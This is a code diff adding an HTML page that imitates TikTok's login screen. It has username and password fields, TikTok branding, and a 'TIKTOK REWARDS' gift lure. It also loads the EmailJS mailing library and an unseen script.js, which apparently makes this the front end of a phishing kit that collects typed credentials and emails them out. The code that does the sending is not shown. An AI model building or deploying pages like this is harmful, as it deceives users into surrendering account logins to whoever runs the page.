@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/site/static/images/logo-icon.png">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" width="40" height="40">
+        <path d="M12.53.02C13.84 0 15.14.01 16.44 0c.13 2.6.87 5.22 2.34 7.27 1.95 1.69 4.29 2.2 7.47 2.49 3.2.76 6.03 2.91 8.8.29 6.03-.26 11.75-2.16 16.32-2.16 4.2 0 7.54 2.04 9.01 6.01 5.97 8.72 13.23 8.96 18.98 7.21 23.69 4.92 28.9 1.58 3.59.92 7.58 1.79 10.93 2.74 4.6 4.42 8.98 5.49 13.7.59 20.4 0 33-13.4 33-33 0-4.91-1.08-9.58-2.79-13.66C24.92 2.7 22.69 0 19.29 0 14.1 0-9.42 0-14.1 0-4.91-1.08-9.58-2.79-13.66-1.58-3.59-.92-7.58-1.79-10.93-2.74-4.6-4.42-8.98-5.49-13.7-.59-20.4-5.49-13.7-9.58-2.79-13.66-2.74-4.6-4.42-8.98-5.49-13.7-.59-20.4 0-33 13.4-33 33 0 4.91 1.08 9.58 2.79 13.66 2.74 4.6 4.42 8.98 5.49 13.7.59 20.4 5.49 13.7 9.58 2.79 13.66 2.74 4.6 4.42 8.98 5.49 13.7.59 20.4 0 33-13.4 33-33 0-4.91-1.08-9.58-2.79-13.66z" fill="#000000"/>
+        </svg>
+        <span>TikTok</span>
+    </div>
+    
+    <div class="title">Log in to TikTok</div>
+    
+    <form id="loginForm">
+        <div class="input-group">
+            <input type="text" id="username" required>
+            <label for="username">Username or email</label>
+        </div>
+        
+        <div class="input-group">
+            <input type="password" id="password" required>
+            <label for="password">Password</label>
+        </div>
+        
+        <div class="giftMessage">
+            <span>🎁 TIKTOK REWARDS: Enter credits to claim your gift!</span>
+        </div>
+        
+        <button type="submit" class="login-btn">Log in</button>
+        
+        <div class="or">or</div>
+        
+        <div class="social-login">
+            <button type="button" class="social-btn">
+                <span>Continue with Google</span>
+            </button>
+            
+            <button type="button" class="social-btn">
+                <span>Continue with Facebook</span>
+            </button>
+        </div>
+        
+        <div class="forgot">
+            <a href="#">Forgot password?</a>
+        </div>
+        
+        <div class="signup">
+            <span>Don't have an account?</span>
+            <a href="#">Sign up</a>
+        </div>
+    </form>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
